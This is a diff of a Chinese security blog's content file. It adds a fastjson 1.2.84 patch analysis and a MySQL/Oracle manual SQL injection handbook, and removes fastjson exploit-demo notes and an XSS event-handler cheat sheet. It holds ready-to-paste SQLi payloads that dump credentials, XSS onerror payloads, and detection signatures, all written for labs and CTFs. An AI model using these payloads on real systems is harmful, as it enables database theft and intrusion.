+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 1.2.84 新增（示意，具体行号以该版本源码为准）</span></span><br><span class="line"><span class="keyword">if</span> (TypeUtils.hasIllegalTypeNameChars(typeName)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">hasIllegalTypeNameChars</span><span class="params">(String typeName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> typeName.indexOf(<span class="string">&#x27;:&#x27;</span>) &gt;= <span class="number">0</span> || typeName.indexOf(<span class="string">&#x27;!&#x27;</span>) &gt;= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>关键在于位置</strong>：它在 1479 行的探测<strong>之前</strong>。所以 <code>jar:</code> &#x2F; <code>!</code> 一出现，请求在入口就被拒：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">SSRF（1484 行）            ← 被拦</span><br><span class="line">读字节 + 注解识别（1492）   ← 被拦</span><br><span class="line">defineClass + &lt;clinit&gt;     ← 被拦</span><br></pre></td></tr></table></figure>
+
+<p>这解释了为什么 1.2.84 上连”探测”都做不了，而底层类加载器本身仍能被直接调用去加载任意文件——<strong>修的是”用 @type 触达加载器”这条路，不是加载器本身。</strong></p>
+<hr>
+<h2 id="10-源码与载荷的交点"><a href="#10-源码与载荷的交点" class="headerlink" title="10. 源码与载荷的交点"></a>10. 源码与载荷的交点</h2><table>
 <thead>
 <tr>
-<th>现象</th>
-<th>真实原因</th>
-<th>处理</th>
+<th>载荷里的东西</th>
+<th>被哪一行消费</th>
+<th>缺失后果</th>
 </tr>
 </thead>
 <tbody><tr>
-<td><code>stream:false</code></td>
-<td>路径不对：Linux 路径打在 Windows 上、jar 名带点、类不在默认包</td>
-<td>用 <code>jar tf f</code> 看内部路径；确认 <code>@type</code> 点号还原后等于文件真实路径</td>
+<td><code>@JSONType</code> 描述符（42 字节）</td>
+<td><code>TypeCollector.java:71</code></td>
+<td><code>jsonType=false</code> → <code>1542</code> 抛 <code>autoType is not support</code></td>
 </tr>
 <tr>
-<td><code>stream:true</code> 但 <code>jsonTypeDirect:false</code></td>
-<td>类上没写 <code>@JSONType</code>，或注解被 <code>RetentionPolicy</code> 限制</td>
-<td><code>javap -v -p Evil.class | grep -A2 RuntimeVisibleAnnotations</code></td>
-</tr>
-<tr>
+<td><code>this_class</code>（<code>jar:file:/...!/Evil</code>）</td>
+<td><code>TypeUtils.java:1761</code> → <code>defineClass</code></td>
 <td><code>wrong name: Evil</code></td>
-<td>没改 <code>this_class</code></td>
-<td>跑 <code>patch_name.py</code>，再用 <code>javap</code> 校验</td>
 </tr>
 <tr>
-<td><code>NoClassDefFoundError: pwn/Pwn</code></td>
-<td>类不自包含</td>
-<td>去掉对外部类的引用</td>
+<td><code>static {}</code> 里的命令</td>
+<td><code>&lt;clinit&gt;</code>（<code>1778</code> 实例化时触发）</td>
+<td>类加载成功，无任何效果</td>
 </tr>
 <tr>
-<td><code>UnsupportedClassVersionError</code></td>
-<td>没用 <code>--release 8</code></td>
-<td>重新编译</td>
-</tr>
-<tr>
-<td><code>ClassFormatError: Illegal class name &quot;jar:http://...&quot;</code></td>
-<td>用了远程形态</td>
-<td>换 <code>jar:file:</code>，见 1.4</td>
-</tr>
-<tr>
-<td><code>ok:true</code> 但什么都没发生</td>
-<td>类名命中缓存，<code>&lt;clinit&gt;</code> 不再执行</td>
-<td>换 jar 名（<code>f</code>→<code>g</code>）或重启靶场，见 3.6</td>
+<td>jar 根目录的 <code>Evil.class</code></td>
+<td><code>ParserConfig.java:1482</code> 拼出的路径</td>
+<td><code>stream=false</code>，<code>bytes=0</code></td>
 </tr>
 </tbody></table>
-<h2 id="3-6-类缓存陷阱（演示最容易翻车的地方）"><a href="#3-6-类缓存陷阱（演示最容易翻车的地方）" class="headerlink" title="3.6 类缓存陷阱（演示最容易翻车的地方）"></a>3.6 类缓存陷阱（演示最容易翻车的地方）</h2><p>同一个类名第二次打，会看到 <code>ok:true</code> 但<strong>什么都不发生</strong>。原因在 <code>TypeUtils.loadClass</code> 开头：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span>&lt;?&gt; <span class="variable">clazz</span> <span class="operator">=</span> mappings.get(className);</span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) <span class="keyword">return</span> clazz;</span><br></pre></td></tr></table></figure>
+<p>调用链完整版：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">@type 字符串（用户可控）</span><br><span class="line">   → replace(&#x27;.&#x27;,&#x27;/&#x27;) + &quot;.class&quot;     变成一次合法 URL      1482</span><br><span class="line">   → getResourceAsStream             目标替你打开文件       1484</span><br><span class="line">   → ASM 扫注解表                     看到自签的 @JSONType    1492</span><br><span class="line">   → jsonType=true                   判定&quot;可信&quot;            1493</span><br><span class="line">   → loadClass(原始字符串)            交给 classloader       1502</span><br><span class="line">   → defineClass(name=原始字符串)     JVM 按 this_class 校验  1761</span><br><span class="line">   → &lt;clinit&gt;                         代码执行               1778</span><br></pre></td></tr></table></figure>
 
-<p>第一次加载时类已经初始化过，<code>&lt;clinit&gt;</code> 不会再执行。所以：</p>
-<ul>
-<li><code>ok:true</code> 只代表”类存在、实例创建成功”，<strong>不代表代码刚刚又跑了一遍</strong>；</li>
-<li>演示时每打一次就换一个类名（<code>f</code> → <code>g</code> → <code>h</code>，每次重新 patch），或者重启靶场。</li>
-</ul>
-<p>判断”这次到底执行没有”，看两个副作用：证明文件的 mtime、计算器进程数。</p>
-<hr>
-<h1 id="附录-A：修复与检测"><a href="#附录-A：修复与检测" class="headerlink" title="附录 A：修复与检测"></a>附录 A：修复与检测</h1><h2 id="A-1-1-2-84-改了什么"><a href="#A-1-1-2-84-改了什么" class="headerlink" title="A.1 1.2.84 改了什么"></a>A.1 1.2.84 改了什么</h2><p><code>checkAutoType</code> 入口新增（<code>ParserConfig.java</code> 1363–1367）：</p>
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// a URL-special type name can never be a class name; reject it here the same way any</span></span><br><span class="line"><span class="comment">// unresolvable @type is rejected, so it never reaches the class loader</span></span><br><span class="line"><span class="keyword">if</span> (TypeUtils.hasIllegalTypeNameChars(typeName)) &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">hasIllegalTypeNameChars</span><span class="params">(String typeName)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> typeName.indexOf(<span class="string">&#x27;:&#x27;</span>) &gt;= <span class="number">0</span> || typeName.indexOf(<span class="string">&#x27;!&#x27;</span>) &gt;= <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p><strong>为什么四行就够</strong>：这个漏洞的每一种可达形态，都必须把 <code>jar:...!/...</code> 塞进 <code>@type</code>，而这种名字必然同时包含 <code>:</code> 和 <code>!</code>。在入口拒掉这两个字符，探测阶段就拿不到名字（<strong>SSRF 一起被堵</strong>），定义阶段也走不到 <code>defineClass</code>。</p>
-<h2 id="A-2-修复优先级"><a href="#A-2-修复优先级" class="headerlink" title="A.2 修复优先级"></a>A.2 修复优先级</h2><ol>
-<li>升 <strong>1.2.84</strong> 及以上维护版本；</li>
-<li>升不了就开 SafeMode：<code>-Dfastjson.parser.safeMode=true</code>（实测在探测之前就拒绝，PoC 端零请求）；</li>
-<li>换 <code>1.2.83_noneautotype</code> 构建；</li>
-<li>长期迁移 fastjson2（≥ 2.0.63）；</li>
-<li>配套：出站白名单（阻断回连）+ 禁止把请求体直接喂给 <code>JSON.parse</code>。</li>
-</ol>
-<h2 id="A-3-检测特征"><a href="#A-3-检测特征" class="headerlink" title="A.3 检测特征"></a>A.3 检测特征</h2><ul>
-<li><code>@type</code> 的值里同时出现 <code>:</code> 和 <code>!</code>，或出现 <code>jar:</code> &#x2F; <code>http:</code> &#x2F; <code>..</code> 组合；</li>
-<li>应用进程对陌生地址发起 <code>GET</code> &#x2F; <code>HEAD</code>，path 以 <code>.class</code> 结尾，UA 形如 <code>Java/1.17.0</code>；</li>
-<li>日志出现类名式异常：<code>wrong name: ...</code>、<code>Illegal class name &quot;jar:...&quot;</code>；</li>
-<li><code>/tmp</code> 出现小体积 jar，或应用进程拉起 <code>sh -c</code> &#x2F; <code>cmd /c</code> 子进程；</li>
-<li>进程内出现名字极不寻常的类（<code>jar:file:...</code> 这种类名在任何工具里都极其显眼）。</li>
-</ul>
-<hr>
-<h1 id="附录-B：边界与口径"><a href="#附录-B：边界与口径" class="headerlink" title="附录 B：边界与口径"></a>附录 B：边界与口径</h1><p>仅用于自有环境 &#x2F; 授权范围，靶场不要暴露公网。本套 payload 只做两件事：启动一个计算器、写一个证明文件；不含反弹 shell、不含持久化、不修改系统。</p>
-<p><strong>汇报时建议主动标注的两点</strong>：</p>
-<ol>
-<li>演示里 payload 是预先放在目标磁盘上的，模拟”攻击者已获得文件落地能力”（上传、临时目录等真实途径），不是凭一个请求凭空达成；</li>
-<li>远程 <code>jar:http://</code> 形态受 JVM 类名校验限制，只能做到 SSRF + 信任伪造，落地必须走本地路径。</li>
-</ol>
-<p>把这两点讲清楚，比”一个请求 getshell”更有说服力，也不容易被现场问倒。</p>
+<p><strong>一句话总结</strong>：这条链上没有一处”绕过”，也没有一处逻辑错误——是检查本身就在做加载，而”可信”的凭据由被检查对象自己签发。</p>
 ]]></content>
       <categories>
         <category>技术</category>
@@ -1255,7 +875,7 @@
   </entry>
   <entry>
     <title></title>
-    <url>/2026/11/09/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/Java%20%E4%B8%AD%E7%9A%84sql%20%E6%B3%A8%E5%85%A5/</url>
+    <url>/2026/11/11/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/Java%20%E4%B8%AD%E7%9A%84sql%20%E6%B3%A8%E5%85%A5/</url>
     <content><![CDATA[]]></content>
       <categories>
         <category>技术</category>
@@ -1366,6 +986,183 @@
       </categories>
       <tags>
         <tag>sql靶场</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Oracle sql</title>
+    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/SQLi/Oracle%20sql/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="MySQL-Oracle-手工-SQL-注入-整合完整版手册"><a href="#MySQL-Oracle-手工-SQL-注入-整合完整版手册" class="headerlink" title="MySQL &amp; Oracle 手工 SQL 注入 整合完整版手册"></a>MySQL &amp; Oracle 手工 SQL 注入 整合完整版手册</h1><blockquote>
+<p>适用：PortSwigger 靶场、CTF 手工注入</p>
+<p>Payload 全部为<strong>原始文本，直接粘贴进 Burp Repeater 参数 value 框，不用手动 URL 编码</strong></p>
+<p>核心原理两者完全一致：<strong>用户可控输入直接拼接进 SQL 字符串，未使用预编译，导致注入</strong></p>
+<p>预编译局限：只能防护 WHERE 条件里的值；<strong>ORDER BY&#x2F;GROUP BY 这类 SQL 结构拼接，预编译无效，只能白名单</strong></p>
+</blockquote>
+<hr>
+<h2 id="一、系统元数据映射（最重要！）"><a href="#一、系统元数据映射（最重要！）" class="headerlink" title="一、系统元数据映射（最重要！）"></a>一、系统元数据映射（最重要！）</h2><table>
+<thead>
+<tr>
+<th>功能</th>
+<th>MySQL</th>
+<th>Oracle</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查询所有表</td>
+<td><code>information_schema.tables</code></td>
+<td><code>all_tables</code> &#x2F; <code>user_tables</code></td>
+<td><code>user_tables</code>只看当前用户自己的表，注入优先用；<code>all_tables</code>能看当前用户有权限访问的所有表；<code>dba_tables</code>需要 DBA 权限</td>
+</tr>
+<tr>
+<td>查询所有列</td>
+<td><code>information_schema.columns</code></td>
+<td><code>all_tab_columns</code> &#x2F; <code>user_tab_columns</code></td>
+<td>视图里的字段名都叫<code>table_name</code>、<code>column_name</code>，只是存放位置不同</td>
+</tr>
+<tr>
+<td>筛选当前库 &#x2F;schema</td>
+<td><code>table_schema=database()</code></td>
+<td><code>owner=USER</code></td>
+<td>MySQL 叫数据库；Oracle 叫 Schema (用户)</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>记忆口诀：</p>
+<p>MySQL：查表、列都在<code>information_schema</code>里面</p>
+<p>Oracle：没有<code>information_schema</code>，用<code>user_tables</code>&#x2F;<code>user_tab_columns</code>（优先）</p>
+</blockquote>
+<hr>
+<h2 id="二、基础语法-注入常用函数对比"><a href="#二、基础语法-注入常用函数对比" class="headerlink" title="二、基础语法 &amp; 注入常用函数对比"></a>二、基础语法 &amp; 注入常用函数对比</h2><p>![[Pasted image 20261015210139.png|700]]</p>
+<h3 id="关键名词解释"><a href="#关键名词解释" class="headerlink" title="关键名词解释"></a>关键名词解释</h3><ol>
+<li><strong>dual</strong>：Oracle 虚拟伪表，只有一行空数据。Oracle 语法强制 SELECT 必须带 FROM，查常量、函数结果没有真实表时，用<code>FROM dual</code>占位。</li>
+<li><strong>ROWNUM</strong>：Oracle 伪列，不是表真实字段。查询输出结果之后，按顺序给每行分配编号，从 1 开始。只能直接用<code>ROWNUM=1</code>获取第一条。</li>
+<li><strong>LISTAGG</strong>：Oracle 聚合函数，把多条查询结果合并为一行字符串，自定义分隔符。靶场表少的时候，一次性爆出全部表 &#x2F; 列。超过 4000 字符失效，改用<code>ROWNUM+NOT IN</code>逐行获取。</li>
+</ol>
+<hr>
+<h2 id="三、注入通用流程（MySQL、Oracle-一样）"><a href="#三、注入通用流程（MySQL、Oracle-一样）" class="headerlink" title="三、注入通用流程（MySQL、Oracle 一样）"></a>三、注入通用流程（MySQL、Oracle 一样）</h2><ol>
+<li>找注入点：输入单引号<code>&#39;</code>，观察页面是否报错</li>
+<li><code>ORDER BY</code> 猜查询返回的列数量</li>
+<li>UNION SELECT，匹配<strong>列数量</strong>和<strong>列数据类型</strong></li>
+<li>查询版本 → 查询表名 → 查询列名 → 查询表内数据</li>
+</ol>
+<blockquote>
+<p>下面 Payload 统一场景：原始查询返回 2 列，注入点 category，原始 SQL：<code>SELECT name,description FROM products WHERE category=&#39;$cat&#39; AND released=1</code></p>
+</blockquote>
+<h3 id="UNION-联合注入（有回显，优先使用）"><a href="#UNION-联合注入（有回显，优先使用）" class="headerlink" title="UNION 联合注入（有回显，优先使用）"></a>UNION 联合注入（有回显，优先使用）</h3><h4 id="MySQL-Payload"><a href="#MySQL-Payload" class="headerlink" title="MySQL Payload"></a>MySQL Payload</h4><p>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT VERSION(),DATABASE() -- </span><br></pre></td></tr></table></figure>
+
+<p>一次性爆全部表</p>
+<p>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT GROUP_CONCAT(table_name,&#x27;:&#x27;),null FROM information_schema.tables WHERE table_schema=DATABASE() -- </span><br></pre></td></tr></table></figure>
+
+<p>一次性爆目标表所有列（假设表 users）</p>
+<p>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT GROUP_CONCAT(column_name,&#x27;:&#x27;),null FROM information_schema.columns WHERE table_schema=DATABASE() AND table_name=&#x27;users&#x27; -- </span><br></pre></td></tr></table></figure>
+
+<p>读取数据</p>
+<p>plaintext</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; UNION SELECT username,password FROM users LIMIT 0,1 -- </span><br></pre></td></tr></table></figure>
+
+<h4 id="Oracle-Payload（PortSwigger-靶场直接复制）"><a href="#Oracle-Payload（PortSwigger-靶场直接复制）" class="headerlink" title="Oracle Payload（PortSwigger 靶场直接复制）"></a>Oracle Payload（PortSwigger 靶场直接复制）</h4><p>测试 dual，验证 UNION 是否通</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT &#x27;test123&#x27;,null FROM dual -- </span><br></pre></td></tr></table></figure>
+
+<p>查询版本</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT banner,null FROM v$version -- </span><br></pre></td></tr></table></figure>
+
+<p>一次性爆出当前用户全部表（listagg 推荐）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT listagg(table_name,&#x27;:&#x27;) within group (order by table_name),null FROM user_tables -- </span><br></pre></td></tr></table></figure>
+
+<p>一次性爆出目标表所有列（假设表 USERS，大写）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT listagg(column_name,&#x27;:&#x27;) within group (order by column_name),null FROM user_tab_columns WHERE table_name=&#x27;USERS&#x27; -- </span><br></pre></td></tr></table></figure>
+
+<p>读取表内数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT USERNAME,PASSWORD FROM USERS WHERE ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
+
+<h5 id="listagg-失效备选：逐行获取（ROWNUM-NOT-IN）"><a href="#listagg-失效备选：逐行获取（ROWNUM-NOT-IN）" class="headerlink" title="listagg 失效备选：逐行获取（ROWNUM + NOT IN）"></a>listagg 失效备选：逐行获取（ROWNUM + NOT IN）</h5><p>拿第一张表</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT table_name,null FROM user_tables WHERE ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
+
+<p>拿到第一张表（例：PRODUCTS），填入 NOT IN，拿第二张</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Gifts&#x27; UNION SELECT table_name,null FROM user_tables WHERE ROWNUM=1 AND table_name NOT IN (&#x27;PRODUCTS&#x27;) -- </span><br></pre></td></tr></table></figure>
+
+<p>原理：剔除已经获取到的数据，剩下结果集再取第一条，绕开<code>ROWNUM!=2</code>的限制。</p>
+<hr>
+<h2 id="四、其他注入类型-Payload"><a href="#四、其他注入类型-Payload" class="headerlink" title="四、其他注入类型 Payload"></a>四、其他注入类型 Payload</h2><h3 id="1-报错注入"><a href="#1-报错注入" class="headerlink" title="1. 报错注入"></a>1. 报错注入</h3><p>MySQL</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND updatexml(1,concat(0x7e,VERSION(),0x7e),1) -- </span><br></pre></td></tr></table></figure>
+
+<p>Oracle（环境依赖，经常失效）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND utl_inaddr.get_host_name((SELECT table_name FROM user_tables WHERE ROWNUM=1)) -- </span><br></pre></td></tr></table></figure>
+
+<h3 id="2-布尔盲注（页面只有正常-空白两种状态，无回显）"><a href="#2-布尔盲注（页面只有正常-空白两种状态，无回显）" class="headerlink" title="2. 布尔盲注（页面只有正常 &#x2F; 空白两种状态，无回显）"></a>2. 布尔盲注（页面只有正常 &#x2F; 空白两种状态，无回显）</h3><p>MySQL</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND SUBSTRING(DATABASE(),1,1)=&#x27;a&#x27; -- </span><br></pre></td></tr></table></figure>
+
+<p>Oracle</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND SUBSTR(USER,1,1)=&#x27;S&#x27; AND ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>Oracle 截取函数：<code>SUBSTR(字符串,起始位置,长度)</code></p>
+</blockquote>
+<h3 id="3-时间盲注（页面无任何差异，依靠延时判断真假）"><a href="#3-时间盲注（页面无任何差异，依靠延时判断真假）" class="headerlink" title="3. 时间盲注（页面无任何差异，依靠延时判断真假）"></a>3. 时间盲注（页面无任何差异，依靠延时判断真假）</h3><p>MySQL</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND IF(SUBSTRING(DATABASE(),1,1)=&#x27;a&#x27;,SLEEP(5),1) -- </span><br></pre></td></tr></table></figure>
+
+<p>Oracle</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; AND (CASE WHEN SUBSTR(USER,1,1)=&#x27;S&#x27; THEN DBMS_PIPE.RECEIVE_MESSAGE(&#x27;a&#x27;,5) ELSE NULL END) AND ROWNUM=1 -- </span><br></pre></td></tr></table></figure>
+
+<h3 id="4-堆叠注入"><a href="#4-堆叠注入" class="headerlink" title="4. 堆叠注入"></a>4. 堆叠注入</h3><p>MySQL 可用，Oracle 完全无效</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;;INSERT INTO users VALUES(&#x27;test&#x27;,&#x27;123456&#x27;); -- </span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="五、防御方案（MySQL、Oracle-通用）"><a href="#五、防御方案（MySQL、Oracle-通用）" class="headerlink" title="五、防御方案（MySQL、Oracle 通用）"></a>五、防御方案（MySQL、Oracle 通用）</h2><ol>
+<li><p><strong>首选：参数化预编译 PreparedStatement</strong></p>
+<p>  防护 WHERE 子句参数值注入</p>
+<p>  <strong>无法防御 ORDER BY、GROUP BY 这类 SQL 结构拼接，结构类只能白名单</strong></p>
+</li>
+<li><p>最小权限原则：数据库账号只分配业务必需权限，不要 DBA 管理员权限</p>
+</li>
+<li><p>输入校验：白名单 &gt; 黑名单，黑名单容易绕过</p>
+</li>
+<li><p>禁用危险函数 &#x2F; 包</p>
+<ul>
+<li>MySQL：限制<code>secure_file_priv</code>，禁止<code>into outfile</code>写文件</li>
+<li>Oracle：配置 ACL，禁用<code>utl_inaddr</code>、<code>utl_http</code></li>
+</ul>
+</li>
+<li><p>转义函数仅作为辅助防护，存在宽字节注入等绕过方式，不能单独防御注入</p>
+</li>
+<li><p>WAF 属于辅助防护，存在大量绕过手段，不能单独依赖</p>
+</li>
+</ol>
+<hr>
+<h2 id="六、高频坑点汇总"><a href="#六、高频坑点汇总" class="headerlink" title="六、高频坑点汇总"></a>六、高频坑点汇总</h2><h3 id="Oracle-坑"><a href="#Oracle-坑" class="headerlink" title="Oracle 坑"></a>Oracle 坑</h3><ol>
+<li>常量查询必须写<code>FROM dual</code>，直接<code>SELECT &#39;xxx&#39;</code>语法报错</li>
+<li><code>ROWNUM=2</code>直接查询永远为空；listagg 超长报错才用<code>ROWNUM+NOT IN</code>循环爆数据</li>
+<li>UNION 列类型必须严格匹配，不确定就用 null 占位</li>
+<li>表名字典内大写，匹配时引号内必须大写</li>
+<li>注释不能用<code>#</code>，只能<code>--</code> 或者<code>/* */</code></li>
+<li>不支持堆叠注入，分号<code>;</code>不能执行第二条 SQL</li>
+<li>优先使用<code>user_tables</code>&#x2F;<code>user_tab_columns</code>，减少无关数据干扰</li>
+</ol>
+<h3 id="MySQL-坑"><a href="#MySQL-坑" class="headerlink" title="MySQL 坑"></a>MySQL 坑</h3><ol>
+<li><code>GROUP_CONCAT</code>有长度上限，过长会截断</li>
+<li><code>||</code>不是字符串拼接，要用<code>CONCAT()</code></li>
+<li><code>LIMIT m,n</code>：跳过 m 行，取 n 行</li>
+</ol>
+<hr>
+<h2 id="七、最简实操顺序（PortSwigger-Oracle-Lab）"><a href="#七、最简实操顺序（PortSwigger-Oracle-Lab）" class="headerlink" title="七、最简实操顺序（PortSwigger Oracle Lab）"></a>七、最简实操顺序（PortSwigger Oracle Lab）</h2><ol>
+<li><code>ORDER BY</code> 判断列数</li>
+<li><code>Gifts&#39; UNION SELECT &#39;test123&#39;,null FROM dual --</code> 验证 UNION 注入</li>
+<li>listagg 一次性拿全部表名</li>
+<li>listagg 拿目标表全部列名</li>
+<li>UNION SELECT 列 1, 列 2 FROM 目标表 WHERE ROWNUM&#x3D;1 – 读取账号密码</li>
+</ol>
+]]></content>
+      <categories>
+        <category>技术</category>
+        <category>基础漏洞</category>
+        <category>SQLi</category>
+      </categories>
+      <tags>
+        <tag>Orclesql</tag>
       </tags>
   </entry>
   <entry>
@@ -1562,254 +1359,6 @@
       </categories>
   </entry>
   <entry>
-    <title>XSS 高频事件</title>
-    <url>/2026/11/05/%E6%8A%80%E6%9C%AF/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XSS/XSS%20%E9%AB%98%E9%A2%91%E4%BA%8B%E4%BB%B6/</url>
-    <content><![CDATA[<span id="more"></span>
-<h1 id="XSS-高频事件（"><a href="#XSS-高频事件（" class="headerlink" title="XSS 高频事件（"></a>XSS 高频事件（</h1><blockquote>
-<p>场景：<code>&lt; &gt;</code>被过滤，不能注入<code>&lt;script&gt;</code>标签，<strong>只能给已有 HTML 标签追加事件属性</strong>，事件触发就执行 JS。</p>
-</blockquote>
-<h2 id="鼠标事件（最常用，level3-就是这类）"><a href="#鼠标事件（最常用，level3-就是这类）" class="headerlink" title="鼠标事件（最常用，level3 就是这类）"></a>鼠标事件（最常用，level3 就是这类）</h2><ul>
-<li><code>onclick</code>：鼠标<strong>单击</strong>元素触发（level3 用的）</li>
-<li><code>ondblclick</code>：鼠标<strong>双击</strong>触发</li>
-<li><code>onmouseover</code>：鼠标<strong>悬浮放上去</strong>就触发（推荐，不用点击）</li>
-<li><code>onmouseout</code>：鼠标<strong>移开</strong>元素触发</li>
-<li><code>onmousemove</code>：鼠标在元素上移动持续触发</li>
-<li><code>oncontextmenu</code>：<strong>右键菜单</strong>（右键点击）触发</li>
-</ul>
-<h2 id="焦点-键盘事件（input-输入框神器，XSSlab-高频）"><a href="#焦点-键盘事件（input-输入框神器，XSSlab-高频）" class="headerlink" title="焦点 &#x2F; 键盘事件（input 输入框神器，XSSlab 高频）"></a>焦点 &#x2F; 键盘事件（input 输入框神器，XSSlab 高频）</h2><ul>
-<li><code>onfocus</code>：元素<strong>获得焦点</strong>（点进输入框）触发</li>
-<li><code>onblur</code>：元素<strong>失去焦点</strong>（点别处）触发</li>
-<li><code>onkeydown</code>：按下按键瞬间触发</li>
-<li><code>onkeyup</code>：松开按键触发</li>
-<li><code>onkeypress</code>：按键按下并产生字符时触发</li>
-</ul>
-<h2 id="加载-错误事件（可以页面加载自动执行，不需要用户交互！重点）"><a href="#加载-错误事件（可以页面加载自动执行，不需要用户交互！重点）" class="headerlink" title="加载 &#x2F; 错误事件（可以页面加载自动执行，不需要用户交互！重点）"></a>加载 &#x2F; 错误事件（可以页面加载自动执行，不需要用户交互！重点）</h2><blockquote>
-<p>这类最好用，不用用户点、不用悬浮，页面渲染直接弹</p>
-</blockquote>
-<ul>
-<li><code>onload</code>：<strong>元素加载成功</strong>触发（img、svg、iframe、body）</li>
-<li><code>onerror</code>：<strong>元素加载失败</strong>触发，最经典！</li>
-</ul>
-<blockquote>
-<p>示例：<code>&lt;img src=x onerror=alert(1)&gt;</code> src&#x3D;x 图片不存在，直接执行 JS</p>
-</blockquote>
-<ul>
-<li><code>onpageshow</code>：页面展示时触发（body）</li>
-</ul>
-<h2 id="表单、内容事件"><a href="#表单、内容事件" class="headerlink" title="表单、内容事件"></a>表单、内容事件</h2><ul>
-<li><code>onchange</code>：输入框内容改变、下拉框切换触发</li>
-<li><code>onselect</code>：选中输入框里面文字时触发</li>
-<li><code>oncopy</code>：复制内容触发</li>
-<li><code>oncut</code>：剪切内容触发</li>
-<li><code>onpaste</code>：粘贴内容触发</li>
-</ul>
-<h2 id="HTML5-新事件（过滤严格靶场备选）"><a href="#HTML5-新事件（过滤严格靶场备选）" class="headerlink" title="HTML5 新事件（过滤严格靶场备选）"></a>HTML5 新事件（过滤严格靶场备选）</h2><ul>
-<li><code>ontoggle</code>：<code>&lt;details&gt;</code>折叠面板展开 &#x2F; 收起触发</li>
-<li><code>onstart</code>：<code>&lt;marquee&gt;</code>滚动标签启动触发</li>
-</ul>
-<hr>
-<h1 id="两个重要分类（实战区分）"><a href="#两个重要分类（实战区分）" class="headerlink" title="两个重要分类（实战区分）"></a>两个重要分类（实战区分）</h1><ol>
-<li><strong>需要用户交互</strong>：<code>onclick / onmouseover / onfocus</code>（level3 用的，必须用户做动作）</li>
-<li><strong>无交互自动执行</strong>：<code>onerror、onload</code>（优先选！不需要用户点击，访问页面直接触发）</li>
-</ol>
-<blockquote>
-<p>举 onerror 例子：</p>
-<p>payload：<code>&#39;&gt;&lt;img src=x onerror=alert(1)//</code></p>
-<p>原理：图片地址<code>x</code>不存在，触发 onerror，自动执行 alert，不用任何点击。</p>
-</blockquote>
-<h2 id="靶场使用小规则（审计-payload-思路）"><a href="#靶场使用小规则（审计-payload-思路）" class="headerlink" title="靶场使用小规则（审计 payload 思路）"></a>靶场使用小规则（审计 payload 思路）</h2><ol>
-<li>上下文是 input 输入框：优先 <code>onfocus onmouseover onclick</code></li>
-<li>可以注入 img&#x2F;svg 标签：优先 <code>onerror / onload</code>，<strong>免交互</strong></li>
-<li>单引号闭合属性：payload 用 <code>&#39; 事件名=alert(1)//</code></li>
-<li>双引号闭合属性：payload 用 <code>&quot; 事件名=alert(1)//</code></li>
-</ol>
